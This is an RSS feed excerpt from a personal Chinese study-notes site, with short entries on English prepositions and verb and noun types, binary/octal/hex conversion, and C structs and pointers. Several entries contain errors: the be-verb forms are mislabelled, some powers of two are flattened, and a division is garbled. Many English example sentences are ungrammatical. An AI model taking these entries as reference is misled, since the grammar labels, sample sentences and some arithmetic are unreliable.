      <link>https://note.yxzi.xyz/note/subject/english/%E8%AF%8D%E7%B1%BB/%E4%BB%8B%E8%AF%8D/%E4%BB%8B%E8%AF%8D%E8%AF%A6%E8%A7%A3/below/</link>
      <pubDate>Sun, 17 Apr 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/subject/english/%E8%AF%8D%E7%B1%BB/%E4%BB%8B%E8%AF%8D/%E4%BB%8B%E8%AF%8D%E8%AF%A6%E8%A7%A3/below/</guid>
      <description>below 表示位置 below + 表示地点的词语 这种情况表示在某个地点的下面。
 Your cellphone is below the wall.  表示数量、年龄、价值 below + 表示数量、程度、价值、年龄、温度的词语 这种情况表示低于某个临界点或在某个临界点等。
 She is below 20 years old. It is below 20 ℃. The people below 18 years old cant attend my course.  </description>
    </item>
    
    <item>
      <title>English beside</title>
      <link>https://note.yxzi.xyz/note/subject/english/%E8%AF%8D%E7%B1%BB/%E4%BB%8B%E8%AF%8D/%E4%BB%8B%E8%AF%8D%E8%AF%A6%E8%A7%A3/beside/</link>
      <pubDate>Sun, 17 Apr 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/subject/english/%E8%AF%8D%E7%B1%BB/%E4%BB%8B%E8%AF%8D/%E4%BB%8B%E8%AF%8D%E8%AF%A6%E8%A7%A3/beside/</guid>
      <description>beside 表示位置 beside + 表示地点的名词 表示在这个某个地点的旁边或者附近。
  The room beside the bathroom is mine.
  She is beside the bathroom.
  My student drink tea beside the sea every afternoon.
  表示对比 beside + 名词或代词 表示与某人相比。
 Beside his, my trouble is nothing.  表示无关  That is beside the question.  </description>
    </item>
    
    <item>
      <title>English between</title>
      <link>https://note.yxzi.xyz/note/subject/english/%E8%AF%8D%E7%B1%BB/%E4%BB%8B%E8%AF%8D/%E4%BB%8B%E8%AF%8D%E8%AF%A6%E8%A7%A3/between/</link>
      <pubDate>Sun, 17 Apr 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/subject/english/%E8%AF%8D%E7%B1%BB/%E4%BB%8B%E8%AF%8D/%E4%BB%8B%E8%AF%8D%E8%AF%A6%E8%A7%A3/between/</guid>
      <description>between 表示时间、位置、数量  在&amp;hellip;之间。  between + 两个事物/两个人 表示在两者之间。
注意，Among 才是表示三者以上，包括三者。
 He does busines between America and China. They don&amp;rsquo;t know the secret between you and me.  between + 两个时间点 表示在两个时间点之内的这段时间。
 We have a class between 20:00 and 22:00. I will rich between 30 and 50 years old.  表示关系、比较、分配  在&amp;hellip;之间。  between + 名词 这种情况，一般作后置定语，表示两者之间的关系/比较两者等。
 What is the difference between American English an British English.</description>
    </item>
    
    <item>
      <title>进制</title>
      <link>https://note.yxzi.xyz/note/technology/computer/%E8%BF%9B%E5%88%B6/%E8%BF%9B%E5%88%B6/</link>
      <pubDate>Sun, 17 Apr 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/computer/%E8%BF%9B%E5%88%B6/%E8%BF%9B%E5%88%B6/</guid>
      <description>进制 进制也是进位计数制，是人为定义的带进位的计数方法。
十进制是逢十进一，十六进制是逢十六进一，二进制就是逢二进一，以此类推，N 进制就是逢 N 进位。
用不同的进制表示同一个数，虽然使用的进制不一样，但内部依旧表示的同一个数，只是外部所表现形式不一样而已。
进制的表示  B 表示二进制 O 表示八进制 D 表示十进制 H 表示十六进制  二进制的规律  1 = 1 10 = 21 100 = 22 1000 = 23 10000 = 24  </description>
    </item>
    
    <item>
      <title>进制转换</title>
      <link>https://note.yxzi.xyz/note/technology/computer/%E8%BF%9B%E5%88%B6/%E8%BF%9B%E5%88%B6%E8%BD%AC%E6%8D%A2/</link>
      <pubDate>Sun, 17 Apr 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/computer/%E8%BF%9B%E5%88%B6/%E8%BF%9B%E5%88%B6%E8%BD%AC%E6%8D%A2/</guid>
      <description>进制转换 二进制与八进制的转换 二进制转八进制 从右向左，三位一段，分别转换，不够三位补零。
0101110 —&amp;gt; 000, 101, 110，三位一段。
（000 = 0）（101 = 5）（110 = 6），则最后得到八进制数56。
八进制转二进制 将每一个八进制位转换为 3 个二进制位。
27 —&amp;gt; （010）（111），最后得到二进制数10111。
二进制与十六进制的转换 二进制转十六进制 从右向左，四位一段，分别转换，不够四位补零。
因为一个十六进制位有 16 种状态，所以需要 4 个二进制位的排列组合来表示，即每个 16 进制位，都需要用 4 个二进制位来表示，所以，我们可以将一串二进制位划分为好几段，四位为一段，不够四位的在前方补零，最后再一段一段的进行转换。
0101110 —&amp;gt; 0010, 1110，四位一段。
（0010 = 2）（1110 = 14 = E），则最后得到十六进制数2E
十六进制转二进制 将每一个十六进制位转换为 4 个二进制位。
2E —&amp;gt; （0010）（1110），一段四位则最后得到二进制数101110
十进制转 N 进制 **除 N 取余，直至商 0 ，余数倒序。**十六进制需要将余数转换
十进制转二进制 除以二取余，并将余数倒过来，即可得出结果。
比如 185：
 18 / 2 = 92， 余 1</description>
    </item>
    
    <item>
      <title>C 结构体</title>
      <link>https://note.yxzi.xyz/note/technology/language/c/%E7%BB%93%E6%9E%84%E4%BD%93/%E7%BB%93%E6%9E%84%E4%BD%93/</link>
      <pubDate>Fri, 15 Apr 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/c/%E7%BB%93%E6%9E%84%E4%BD%93/%E7%BB%93%E6%9E%84%E4%BD%93/</guid>
      <description>结构体 将一些基本类型数据组合在一起，形成一个新的复合数据类型，这个复合数据类型，就是结构体。
为什么需要结构体 为了表示一些复杂的事物，而普通的基本类型无法满足我们的实际需求
结构体的定义 结构体有三种定义方式，但最常用的定义方式是第一种，第二种和第三种都不常用，相较于第一种定义方式，第一种和第二种方式也不是特别好。
需要注意的是，结构体最后的分号不能省去。
#include &amp;lt;iostream&amp;gt;#include &amp;lt;malloc.h&amp;gt;// 第一种定义结构体的方式 // 只定义变量类型， 但不定义变量名， // 变量名由我们使用这个变量类型的时候定义。 struct Student{  int age;  float score;  char sex; }; // 第二种定义结构体的方式 // 定义的同时，也将变量名（Sts）定义了（变量名写死了）。 struct Students{  int age;  float score;  char sex; } Sts; // 第三种定义结构体的方式 // 没有定义变量类型，只定义了变量名。 struct{  int age;  float score;  char sex; }St;  int main(void) { } </description>
    </item>
    
    <item>
      <title>C 结构体的使用</title>
      <link>https://note.yxzi.xyz/note/technology/language/c/%E7%BB%93%E6%9E%84%E4%BD%93/%E7%BB%93%E6%9E%84%E4%BD%93%E7%9A%84%E4%BD%BF%E7%94%A8/</link>
      <pubDate>Fri, 15 Apr 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/c/%E7%BB%93%E6%9E%84%E4%BD%93/%E7%BB%93%E6%9E%84%E4%BD%93%E7%9A%84%E4%BD%BF%E7%94%A8/</guid>
      <description>结构体的使用 初始化和赋值   初始化一个结构体的时候，可以同时进行赋值。
  先初始化一个结构体，后续再一个变量一个变量的进行赋值。
  #include &amp;lt;iostream&amp;gt;#include &amp;lt;malloc.h&amp;gt; struct Student{  int age;  float score;  char sex; };  int main(void) {  // 初始化结构体，同时进行赋值  struct Student Rainy = {18,98.3,&amp;#39;N&amp;#39;};  // 初始化结构体，后续再一个变量一个变量的进行赋值  struct Student Rainys;  Rainys.age = 21;  Rainys.score = 95.6;  Rainys.sex = &amp;#39;V&amp;#39;;  printf(&amp;#34;%d %f %c\n&amp;#34;,Rainy.age,Rainy.score,Rainy.sex);  printf(&amp;#34;%d %f %c&amp;#34;,Rainys.age,Rainys.score,Rainys.sex);  } 访问结构体中的变量  通过结构体变量名.成员变量名的方式去访问结构体中的变量 通过指针变量名-&amp;gt;成员变量名 = (*指针变量名).</description>
    </item>
    
    <item>
      <title>English at</title>
      <link>https://note.yxzi.xyz/note/subject/english/%E8%AF%8D%E7%B1%BB/%E4%BB%8B%E8%AF%8D/%E4%BB%8B%E8%AF%8D%E8%AF%A6%E8%A7%A3/at/</link>
      <pubDate>Fri, 15 Apr 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/subject/english/%E8%AF%8D%E7%B1%BB/%E4%BB%8B%E8%AF%8D/%E4%BB%8B%E8%AF%8D%E8%AF%A6%E8%A7%A3/at/</guid>
      <description>at 表示地点 at + 小地方 at + 小地方容易和 in + 小地方混淆，前者表示在某个地方的范围或附近，而后者表示在某个地方的内部或里面。
 They met me at the station. They are at the balcony. My mother planted some flowers at the balcony.  需要注意的是 at 不能加大地方。
表示时间 在&amp;hellip;时刻 at 都是加一个基数词，表示在几点钟。
 I got up at six this morning. I get up at six every morning.  表示状态或从事与  they are at meeting.  表示速度/价格  I bought it at a low price.</description>
    </item>
    
    <item>
      <title>English 实义动词</title>
      <link>https://note.yxzi.xyz/note/subject/english/%E8%AF%8D%E7%B1%BB/%E5%8A%A8%E8%AF%8D/%E8%B0%93%E8%AF%AD%E5%8A%A8%E8%AF%8D/%E5%AE%9E%E4%B9%89%E5%8A%A8%E8%AF%8D/</link>
      <pubDate>Fri, 15 Apr 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/subject/english/%E8%AF%8D%E7%B1%BB/%E5%8A%A8%E8%AF%8D/%E8%B0%93%E8%AF%AD%E5%8A%A8%E8%AF%8D/%E5%AE%9E%E4%B9%89%E5%8A%A8%E8%AF%8D/</guid>
      <description>实义动词 表示有实际意义的动词，除了系动词、助动词、情态动词，剩下的就是实义动词。
任何一个实义动词都有五种形式（原型、过去式、过去分词、现在分词、第三人称单数格式）。
虽然一个实义动词有五种格式，但是这五种格式都是同一个意思，比如 work、worked、works，都是工作的意思。
为什么一个单词会有五种不同的形式？这是因为英语有时态的变化，即不同的时态，使用不同的形式。
一般来说，过去式、过去分词、现在分词和第三人称单数格式都是通过原型变化而成的。在单词的原型后面增加字母组合，这叫词尾变化。
不及物动词 可以独立完成的动词叫做不及物动词，动词后面不需要物，也不能有物，因为不加物的情况下，这个句子的意思已经完整了
因为，一个单词有不同的意思，因此，一个单词也有可能又是及物动词，又是不及物动词。
 Rainy sleeping. I work.  单及物动词 只有一个动作承受者，单及物动词后面只能跟着一个物。
 Rainy like you. Rainy buy water.  双及物动词  有两个动作承受者，即动词后有两个“物”，一个“动物”，一个“物体”。 Rainy teaches you English。 一般句型为：主语 + 双及物动词 + 间接宾语 + 直接宾语。  复杂及物动词  只有一个动作承受者，动词后面要有一个“物”，这个物后面还要有一个对这个“物”的补充说明 Rainy consider you smart。 一般句型为：主语 + 复杂及物动词 + 宾语 + 宾补。  复合动词 由动词和另一个单词或几个单词所构成的词组。
动词短语虽然由几个词构成，但实际上它只表示一个动作。
 Look after Look forward to Look at Git up  </description>
    </item>
    
    <item>
      <title>English 非实义动词</title>
      <link>https://note.yxzi.xyz/note/subject/english/%E8%AF%8D%E7%B1%BB/%E5%8A%A8%E8%AF%8D/%E8%B0%93%E8%AF%AD%E5%8A%A8%E8%AF%8D/%E9%9D%9E%E5%AE%9E%E4%B9%89%E5%8A%A8%E8%AF%8D/</link>
      <pubDate>Fri, 15 Apr 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/subject/english/%E8%AF%8D%E7%B1%BB/%E5%8A%A8%E8%AF%8D/%E8%B0%93%E8%AF%AD%E5%8A%A8%E8%AF%8D/%E9%9D%9E%E5%AE%9E%E4%B9%89%E5%8A%A8%E8%AF%8D/</guid>
      <description>非实义动词 助动词 它没有意思的，且不能单独使用，只能用于协助系动词或实义动词构成复合谓语。
注意不要将助动词与它本身的实义弄混淆。
比如 Might eat，助动词 might，协助谓语动词 eat 表示可能吃，但 might 也可以表示力量，注意别将助动词与其本身的实义弄混淆。
助动词有：be、do、have、will、would、shall、should.
 Do you love me. I do not love you. I did not love you. She does not love you.  情态动词 它是语气助动词，情态动词本身有意义，但是意义不完整。比如can、should、need、have、dare、had better.
情态动词后面必须跟一个动词原型，才能构成一个复合谓语使用。
情态动词一般不能跟助动词连用。
 I must earn money every day. I should help you. You must be hungry. I can speak English. I have to do.  系动词 不单是动作，将动词之后的信息赋给在动词之前信息。也叫连系动词，即连系表语的词。
系动词不能单独使用，必须跟表语一起用。
系动词大部分都是 be 动词，它有八种形式：
 be（原型） is（第一人称单数） am（第三人称单数） are（You 和复数） was（单数的过去式） were（复数的过去式） being（过去分词） been（现在分词）  be 动词都是是的意思，但有有些时候并不用在一句话中被翻译出来。</description>
    </item>
    
    <item>
      <title>English about</title>
      <link>https://note.yxzi.xyz/note/subject/english/%E8%AF%8D%E7%B1%BB/%E4%BB%8B%E8%AF%8D/%E4%BB%8B%E8%AF%8D%E8%AF%A6%E8%A7%A3/about/</link>
      <pubDate>Thu, 14 Apr 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/subject/english/%E8%AF%8D%E7%B1%BB/%E4%BB%8B%E8%AF%8D/%E4%BB%8B%E8%AF%8D%E8%AF%A6%E8%A7%A3/about/</guid>
      <description>about 表示有关，关于 about + 名词  about Rainy. about Chongqing. about English.  about + 代词的宾格  about + me.  about 动名词短语  about haveing a party. about buying a ship.  当 about 表示关于的时候，只能作后置定语和表语，一般情况不能作状语。
The news about Rainy is not true.
The story is about Susu and Rainy.
表示在附近 about 有时候可以表示在&amp;hellip;附近。
表示在身边 about 表示在身边的时候，一般都用在固定结构里面：Have sth about sb.
 I have a cellphone about me. Jack had a gun about him.</description>
    </item>
    
    <item>
      <title>English after</title>
      <link>https://note.yxzi.xyz/note/subject/english/%E8%AF%8D%E7%B1%BB/%E4%BB%8B%E8%AF%8D/%E4%BB%8B%E8%AF%8D%E8%AF%A6%E8%A7%A3/after/</link>
      <pubDate>Thu, 14 Apr 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/subject/english/%E8%AF%8D%E7%B1%BB/%E4%BB%8B%E8%AF%8D/%E4%BB%8B%E8%AF%8D%E8%AF%A6%E8%A7%A3/after/</guid>
      <description>after 表示时间/顺序 after + 时间点 after 可以放在一个表示具体时间点的词语的前面，表示在&amp;hellip;之后。
 I sleep after 10:00 every day. I Fitness after work. She Play the game after class. I will retire after 35 years old . I born after 2001. I class after Sunday.  after + 一段时间 after 跟表示时间段的词语 。
 He come back after a week. after an hour. after three years.  after + 动名词短语  After getting up every morning, I turn on my computer.</description>
    </item>
    
    <item>
      <title>English as</title>
      <link>https://note.yxzi.xyz/note/subject/english/%E8%AF%8D%E7%B1%BB/%E4%BB%8B%E8%AF%8D/%E4%BB%8B%E8%AF%8D%E8%AF%A6%E8%A7%A3/as/</link>
      <pubDate>Thu, 14 Apr 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/subject/english/%E8%AF%8D%E7%B1%BB/%E4%BB%8B%E8%AF%8D/%E4%BB%8B%E8%AF%8D%E8%AF%A6%E8%A7%A3/as/</guid>
      <description>as 表示当作/作为 as + 一个表示人的名词  As a good wife, you should know how to cook. As a good husband, I must earn much money. As a Englishs teacher, I am happy.  as + 名词 这个时候 as + 名词是放在句尾作状语，这个时候 as 后面的名词不一定是表示人的名词。
 I eat rice gruel as breakfast.（把稀饭当作早餐） I chose the novel as my textbook. Don’t treat me as  </description>
    </item>
    
    <item>
      <title>English by</title>
      <link>https://note.yxzi.xyz/note/subject/english/%E8%AF%8D%E7%B1%BB/%E4%BB%8B%E8%AF%8D/%E4%BB%8B%E8%AF%8D%E8%AF%A6%E8%A7%A3/by/</link>
      <pubDate>Thu, 14 Apr 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/subject/english/%E8%AF%8D%E7%B1%BB/%E4%BB%8B%E8%AF%8D/%E4%BB%8B%E8%AF%8D%E8%AF%A6%E8%A7%A3/by/</guid>
      <description>by by 有时候是介词，有时候也会和其他的词组成一些介词短语。
 stand by pass by  这里主要说一些 by 作普通介词短情况。
表示时间  到&amp;hellip;为止。  By + 表示时间的词语，表示到某个时间点为止。
 He ought to be here by now. by the end of this term, I had learned 300 words. Rainy has made a lot of money by now.  表示位置  强调靠近 在&amp;hellip;旁边。 在&amp;hellip;身边。  by 可以表示位置，与 beside 是同义词。区别就是 beside 用的多，by 用的少，后者更强调靠近的意思。
 She lives by the sea. The house by the sea is beautiful.</description>
    </item>
    
    <item>
      <title>English during</title>
      <link>https://note.yxzi.xyz/note/subject/english/%E8%AF%8D%E7%B1%BB/%E4%BB%8B%E8%AF%8D/%E4%BB%8B%E8%AF%8D%E8%AF%A6%E8%A7%A3/during/</link>
      <pubDate>Thu, 14 Apr 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/subject/english/%E8%AF%8D%E7%B1%BB/%E4%BB%8B%E8%AF%8D/%E4%BB%8B%E8%AF%8D%E8%AF%A6%E8%A7%A3/during/</guid>
      <description>during 表示时间  在&amp;hellip;期间 在&amp;hellip;的时候  during + 表示特定时间的名词构成介词短语，但是 during 后面这个名词必须在意义上含有一段时间，又不能是表示时间点的词语，所以不能直接跟数词.
 during 5:10 She eared one million dollars during the ten days. He came during your absence.  </description>
    </item>
    
    <item>
      <title>English in</title>
      <link>https://note.yxzi.xyz/note/subject/english/%E8%AF%8D%E7%B1%BB/%E4%BB%8B%E8%AF%8D/%E4%BB%8B%E8%AF%8D%E8%AF%A6%E8%A7%A3/in/</link>
      <pubDate>Thu, 14 Apr 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/subject/english/%E8%AF%8D%E7%B1%BB/%E4%BB%8B%E8%AF%8D/%E4%BB%8B%E8%AF%8D%E8%AF%A6%E8%A7%A3/in/</guid>
      <description>in 表示在某个地方。 in + 大地方 这种情况，表示在某个地方，没有里面的意思。
 We live in the world. The people in Asia are poor. She is in Shanghai.  in + 小地方 这种情况，表示在某个地方内部。
 They are making shoes in the factory. They make shoes in the factory every. The girl in the factory are young.  另外，还有一些含有 in 的固定介词短语，这些固定的介词短语，有固定的意思和用法。
表示时间 in + 年份/月份  I set up my website in 2021. I met my wife in 2021.</description>
    </item>
    
    <item>
      <title>English on</title>
      <link>https://note.yxzi.xyz/note/subject/english/%E8%AF%8D%E7%B1%BB/%E4%BB%8B%E8%AF%8D/%E4%BB%8B%E8%AF%8D%E8%AF%A6%E8%A7%A3/on/</link>
      <pubDate>Thu, 14 Apr 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/subject/english/%E8%AF%8D%E7%B1%BB/%E4%BB%8B%E8%AF%8D/%E4%BB%8B%E8%AF%8D%E8%AF%A6%E8%A7%A3/on/</guid>
      <description>on 表示位置 在&amp;hellip;上面 on 加一个表示物体的名词，表示在这个物体的上面，并且强调跟物体的表面接触。
 Children are playing a game on the floor, The picture on the wall is expensive. My book is one the bed.  表示时间 在..时候 on + 表示时间的名词构成介词短语的时候，一般表示一天之内的时间（具体某一天），比如某日、星期几、日期、或某日的上午/中午/下午/晚上等等。
 The handsome man met Pandora on the morning of May 10,2003. We will have a party on July 15. He came on the morning of My 1st.  表示状态 处于&amp;hellip;状态  Who is on duty today? The house is on fire.</description>
    </item>
    
    <item>
      <title>C 多级指针</title>
      <link>https://note.yxzi.xyz/note/technology/language/c/%E6%8C%87%E9%92%88/%E5%A4%9A%E7%BA%A7%E6%8C%87%E9%92%88/</link>
      <pubDate>Wed, 13 Apr 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/c/%E6%8C%87%E9%92%88/%E5%A4%9A%E7%BA%A7%E6%8C%87%E9%92%88/</guid>
      <description>多级指针 其实就是指针的指针int**，或指针的指针的指针int***，或者指针的指针的指针的指针int****。
#include &amp;lt;iostream&amp;gt;#include &amp;lt;malloc.h&amp;gt; int main() {  // i 存放的是 int 类型  int i = 10;  // p 存放 i 的地址，且这个地址只能是 int 类型的地址，因为 p 是 int 类型的指针变量。  int * p = &amp;amp;i;  // q 存放 p 的地址，且这个地址只能是 int * 类型的地址，不能存放 int 类型的地址，因为 q 是 int* 类型的指针变量。  int ** q = &amp;amp;p;  // r 存放 q 的地址,且这个地址只能int**的地址，不能存放 int * 类型的地址，因为 r 是 int **类型的指针变量。  int *** r = &amp;amp;q;  printf(&amp;#34;%d&amp;#34;,***r); } #include &amp;lt;iostream&amp;gt;#include &amp;lt;malloc.</description>
    </item>
    
    <item>
      <title>C 跨函数使用内存</title>
      <link>https://note.yxzi.xyz/note/technology/language/c/%E6%8C%87%E9%92%88/%E8%B7%A8%E5%87%BD%E6%95%B0%E4%BD%BF%E7%94%A8%E5%86%85%E5%AD%98/</link>
      <pubDate>Wed, 13 Apr 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/c/%E6%8C%87%E9%92%88/%E8%B7%A8%E5%87%BD%E6%95%B0%E4%BD%BF%E7%94%A8%E5%86%85%E5%AD%98/</guid>
      <description>跨函数使用变量 静态内存不能跨函数使用 当静态函数终止之后，这个静态函数中的数据就不能被其他函数访问，因为这个静态函数的内存空间已经被释放了。就算可以使用，也是非法访问，这样是不对的。
#include &amp;lt;iostream&amp;gt;#include &amp;lt;malloc.h&amp;gt;// q 是指针变量，无论 q 是什么类型的指针变量，都只占 4 个字节 // 将实参 *p 传入 fun 函数的形参，则**q = *p, 则*q = p，q 存放的是 p 的地址， void fun(int **q){  int i = 5;  // ** q = i  // *q = p  //q = p 的地址  // **q = *p  // 因为 *q = p，所以这里相当于 p = &amp;amp;1，  *q = &amp;amp;i; } int main(void) {  int *p;  // 取 p（*p） 的地址，传入函数 fun，实际传入的是 *p，则 **q = *p  fun(&amp;amp;p);  // 下面代码语法没问题，但是逻辑上有问题。  // 这是因为当 fun 函数执行完毕后，fun 函数中的 i 变量已经被释放，  // 因此，p 虽然可以存放 i 的地址， 但是却不能访问 i 。  // 就算能够访问 i ，这也是非法的访问，没 error 是因为编译器的问题。  printf(&amp;#34;%d\n&amp;#34;,*p); } 动态内存可以跨函数使用 因为当一个函数执行完毕，动态内存分配的变量不会随着fun()的自动释放而释放，所以，当fun()被系统自动释放后，我们依旧可以访问变量*p</description>
    </item>
    
    <item>
      <title>English 专有名词</title>
      <link>https://note.yxzi.xyz/note/subject/english/%E8%AF%8D%E7%B1%BB/%E5%90%8D%E8%AF%8D/%E4%B8%93%E6%9C%89%E5%90%8D%E8%AF%8D/</link>
      <pubDate>Wed, 13 Apr 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/subject/english/%E8%AF%8D%E7%B1%BB/%E5%90%8D%E8%AF%8D/%E4%B8%93%E6%9C%89%E5%90%8D%E8%AF%8D/</guid>
      <description>专用名词 专有名词，就是人名、地名、专门机构等。
大多数的专有名词是不可数名词，在某些情况下可以复数使用，或者转换为普通名词的单数/复数使用。
专有名词的首字母必须大写。
 Rainy is student. Beijing is beautiful China is so large. FBI is very famous  一个可数名词的单数是不能单独再句子或短语里面出现的，需要加限定词（形容词性物主代词，指示代词、数词等等）、冠词或变直接复数。比如 she is teacher这句话就是不对的，应该改为 she is a teacher 或者she is my teacher或 She is Nick&amp;rsquo;s teacher
特殊的 当Mother的首字母大写后，它表示称呼语，相当于一个专有名词，可以单独使用；如果是小写的mother，那么则表示可数名词单数，不能单独使用</description>
    </item>
    
    <item>
      <title>English 普通名词</title>
      <link>https://note.yxzi.xyz/note/subject/english/%E8%AF%8D%E7%B1%BB/%E5%90%8D%E8%AF%8D/%E6%99%AE%E9%80%9A%E5%90%8D%E8%AF%8D/</link>
      <pubDate>Wed, 13 Apr 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/subject/english/%E8%AF%8D%E7%B1%BB/%E5%90%8D%E8%AF%8D/%E6%99%AE%E9%80%9A%E5%90%8D%E8%AF%8D/</guid>
      <description>普通名词 普通名词 除了专业名词以外的词都是普通名词。
普通名词被分为可数名词和不可数名词。
专有名词复数使用，专业名词转换普通名词  There are two Jacks in our class Millions of Lei Fengs have emerged in China Hey, Tom, have a Mrs. Carl is waiting for you  可数名词 可数名词（单数复数都可以，可以用数词计算）
可数名词能加不定冠词（a/an）和数词（one、two）
可数名词可以加定冠词（the）
比如 apple、egg、boy、tree、family、class、police、team 等等
可数名词单数不能单独作主语使用：Book is expensive.
正确的应该是：
 The Book is expensive. My books are good.  单数和复数 单数指的就是一个事物。复数指的是两个及以上的事物。
单数变复数规则  大部分可数名词可以直接在词尾 + s. 以字母 s、sh、x、ch 结尾时，在词尾 +es. 以辅音字母 +y 结尾的时候，把 y 变为 i 后，再 +es。如果以元音字母 + y 结尾时，就不用变化，直接在词尾 +s 即可。 以字母 f 或 fe 结尾的时候，把 f 或 fe 变为 v 后，再＋ es。 以辅音字母 + o 结尾的时候，在词尾 +es 以**元音字母 + o **结尾的可数名词或以 o 结尾的简写词，在词尾 +s.</description>
    </item>
    
    <item>
      <title>English 量词</title>
      <link>https://note.yxzi.xyz/note/subject/english/%E8%AF%8D%E7%B1%BB/%E5%90%8D%E8%AF%8D/%E9%87%8F%E8%AF%8D/</link>
      <pubDate>Wed, 13 Apr 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/subject/english/%E8%AF%8D%E7%B1%BB/%E5%90%8D%E8%AF%8D/%E9%87%8F%E8%AF%8D/</guid>
      <description>量词 我们可以用量词来表示不可数名词的数量。但不是每一个量词都可以修饰每一个不可数名词。
当不可数名词的单复数变化时，只需将量词从单数变为复数。
量词中的 of 时没有意思的，它主要就是为了修饰不可数名词，作前置定语，另外，量词也可以修饰可数名词的复数形式，但不能修饰可数名词的的单数形式。毕竟一个名词用量词修饰，说明这个名词不止一个，如果这个名词还用单数形式的话，就不合理了。
 a glass of water. two bottle of milk. a kilograms of meat. a basket of apples  量词的构成 a/an/one + 可数名词单数 + of  a cup of a bucket of a glass of a box of  数词 + 可数名词的复数 + of  two bottles of three tins of the boxes of  并不是所有可数名词都能构成量词，只有那种有内部空间或表示容器或一些符合逻辑的可数名词才能构成量词。
不要用中文的量词思维来判断英文的量词使用。比如不能 a table of food，因为 table 没有内部空间或表示容器的意思。</description>
    </item>
    
    <item>
      <title>English 介词短语的构成</title>
      <link>https://note.yxzi.xyz/note/subject/english/%E8%AF%8D%E7%B1%BB/%E4%BB%8B%E8%AF%8D/%E4%BB%8B%E8%AF%8D%E7%9F%AD%E8%AF%AD%E7%9A%84%E6%9E%84%E6%88%90/</link>
      <pubDate>Mon, 11 Apr 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/subject/english/%E8%AF%8D%E7%B1%BB/%E4%BB%8B%E8%AF%8D/%E4%BB%8B%E8%AF%8D%E7%9F%AD%E8%AF%AD%E7%9A%84%E6%9E%84%E6%88%90/</guid>
      <description>介词短语的构成 要学好介词短语，先要掌握一个概念：介词宾语。
介词和介词宾语在一起构成的短语叫作介词短语：介词 + 介词宾语 = 介词短语
介词短语可以被分成四种类型。
介词宾语 介词后面的词语叫介词宾语。
介词宾语和宾语是不一样的，千万不要混淆。
宾语是动作的承受。
介词宾语仅仅只是放在介词后面的词语。
介词 + 名词 这是最常见、最普通、最容易的介词短语形式。绝大部分介词后面都可以跟一个名词构成一个介词短语。一个介词短语，不管这个名词是专有名词还是普通名词，当然如果是普通名词，要注意可数名词单复数的问题。
 in China. under the tree. behind my house. beside Rainy.  介词 + 人称代词宾格  beside me. before you. behind him.  介词 +数词 需要注意的是，并不是每一个介词后面都能跟数词。
 in 2023. at 5 : 30.  介词 +动词短语 虽然部分介词的后面可以跟动动词短语构成介词短语，但是这种介词短语的出现频率非常高。
 before having dinner. about learning English. by watching TV.  </description>
    </item>
    
    <item>
      <title>English 介词短语的用法</title>
      <link>https://note.yxzi.xyz/note/subject/english/%E8%AF%8D%E7%B1%BB/%E4%BB%8B%E8%AF%8D/%E4%BB%8B%E8%AF%8D%E7%9F%AD%E8%AF%AD%E7%9A%84%E7%94%A8%E6%B3%95/</link>
      <pubDate>Mon, 11 Apr 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/subject/english/%E8%AF%8D%E7%B1%BB/%E4%BB%8B%E8%AF%8D/%E4%BB%8B%E8%AF%8D%E7%9F%AD%E8%AF%AD%E7%9A%84%E7%94%A8%E6%B3%95/</guid>
      <description>介词短语的用法 作状语 介词短语作状语的时候，可以在主谓宾或主系表中充当时间状语和地点状语，有时候还可以充当方式状语。
作地点状语 当介词作地点状语的时候，这个介词就可以在句子中充当地点状语的作用
主系表 + 介词短语作地点状语
 I am happy in Guangxi. I was sad in Guangxi. They are busy in Beijing.  主谓宾 + 介词短语作地点状语
 I work in China.  作时间状语 当介词作时间状语的时候，这个介词就可以在句子中充当时间状语的作用
 I was young in 2023. I get up at six. We will be famous in 2020.  作方式状语 少数的介词短语，还能表达动作的方式。
 Can you write in English. I tell stories in English.  作后置定语 介词短语作后置定语，跟前置定语一样，只能修饰普通名词。</description>
    </item>
    
    <item>
      <title>CDN</title>
      <link>https://note.yxzi.xyz/note/technology/internet/cdn/</link>
      <pubDate>Sun, 10 Apr 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/internet/cdn/</guid>
      <description>CDN 使网址的加载速度变快。</description>
    </item>
    
    <item>
      <title>Vue</title>
      <link>https://note.yxzi.xyz/note/technology/frame/vue/vue-2/vue/</link>
      <pubDate>Sun, 10 Apr 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/frame/vue/vue-2/vue/</guid>
      <description>Vue Vue 是一套用于构建用户界面的渐进式 JavaScript 框架。
它主要解决了前端开发中的核心痛点 —— 复杂的 DOM 操作。
